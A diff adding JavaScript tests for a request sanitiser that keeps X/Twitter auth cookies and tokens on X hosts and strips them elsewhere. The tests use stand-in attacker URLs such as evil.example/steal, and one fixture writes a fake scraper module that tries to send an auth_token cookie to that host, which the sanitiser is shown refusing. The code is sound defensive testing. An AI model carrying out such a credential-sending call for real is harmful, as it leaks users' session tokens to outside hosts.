@@ -1,6 +1,9 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { xRead } from '../x_reads.js';
+import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
+import os from 'node:os';
+import path from 'node:path';
+import { xRead, sanitizeXReadRequest } from '../x_reads.js';
 
 const tweet = (id, username, inReplyToStatusId, conversationId = '10000', overrides = {}) => ({
   id, username, text: `post ${id}`, inReplyToStatusId, conversationId,
@@ -173,4 +176,64 @@ test('x-read thread keeps chronological order', async () => {
   assert.deepEqual(read.posts.map((post) => post.id), ['30001', '30002', '30003', '30009']);
   assert.deepEqual(scraper.modes, ['Latest']);
   assert.deepEqual(scraper.counts, [40]);
+});
+
+test('sanitizeXReadRequest keeps credentials on X and refuses every other host', () => {
+  const xRequest = sanitizeXReadRequest('https://x.com/i/api/graphql/abc', {
+    method: 'POST',
+    headers: { cookie: 'auth_token=secret', 'x-csrf-token': 'csrf', 'content-type': 'application/json' },
+    body: '{}',
+  });
+  assert.equal(xRequest.url, 'https://x.com/i/api/graphql/abc');
+  assert.equal(xRequest.options.method, 'POST');
+  assert.equal(xRequest.options.headers.cookie, 'auth_token=secret');
+  assert.equal(xRequest.options.body, '{}');
+  assert.equal(sanitizeXReadRequest('https://api.twitter.com/2/tweets').url, 'https://api.twitter.com/2/tweets');
+
+  const dictionary = sanitizeXReadRequest('https://raw.githubusercontent.com/fa0311/x-client-transaction-id-pair-dict/main/pair.json', {
+    method: 'GET',
+    headers: { Cookie: 'auth_token=secret', Authorization: 'Bearer secret', 'X-CSRF-Token': 'csrf', accept: 'application/json' },
+    body: 'ignored',
+  });
+  assert.deepEqual(dictionary.options.headers, { accept: 'application/json' });
+  assert.equal('body' in dictionary.options, false);
+
+  const viaHeaders = sanitizeXReadRequest('https://pbs.twimg.com/media/x.jpg', {
+    headers: new Headers({ cookie: 'auth_token=secret', accept: 'image/jpeg' }),
+  });
+  assert.equal(viaHeaders.options.headers.get('cookie'), null);
+  assert.equal(viaHeaders.options.headers.get('accept'), 'image/jpeg');
+
+  const viaEntries = sanitizeXReadRequest('https://pbs.twimg.com/media/x.jpg', {
+    headers: [['cookie', 'auth_token=secret'], ['accept', 'image/jpeg']],
+  });
+  assert.deepEqual(viaEntries.options.headers, [['accept', 'image/jpeg']]);
+
+  assert.throws(() => sanitizeXReadRequest('https://evil.example/steal'), /Refusing non-X read host: evil\.example/);
+  assert.throws(() => sanitizeXReadRequest('https://x.com.evil.example/steal'), /Refusing non-X read host/);
+  assert.throws(() => sanitizeXReadRequest('http://x.com/i/api/graphql/abc'), /Refusing non-HTTPS X read URL: http:/);
+  assert.throws(() => sanitizeXReadRequest('https://raw.githubusercontent.com/fa0311/x-client-transaction-id-pair-dict/main/other.json'), /Refusing non-X read host/);
+  assert.throws(() => sanitizeXReadRequest('https://raw.githubusercontent.com/fa0311/x-client-transaction-id-pair-dict/main/pair.json?raw=1'), /Refusing non-X read host/);
+  assert.throws(() => sanitizeXReadRequest('https://pbs.twimg.com/media/x.jpg', { method: 'POST' }), /Refusing POST to auxiliary host pbs\.twimg\.com/);
+});
+
+test('createXReader refuses a non-X fetch before the request leaves', async () => {
+  const dir = await mkdtemp(path.join(os.tmpdir(), 'x-reads-firewall-'));
+  try {
+    await mkdir(path.join(dir, 'src', 'client'), { recursive: true });
+    await writeFile(path.join(dir, 'src', 'client', 'index.js'), `export class Scraper {
+  constructor(options) { this.options = options; }
+  async setCookies() {}
+  async *searchTweets() {
+    await this.options.fetch('https://evil.example/steal', { headers: { cookie: 'auth_token=secret' } });
+  }
+}
+`);
+    const read = await xRead({ kind: 'mentions' }, { dir, env: { AUTH_TOKEN: 'token', X_ACCOUNT: 'ham_zax' } });
+    assert.equal(read.ok, false);
+    assert.equal(read.fallback, 'browser');
+    assert.match(read.reason, /Refusing non-X read host: evil\.example/);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
 });
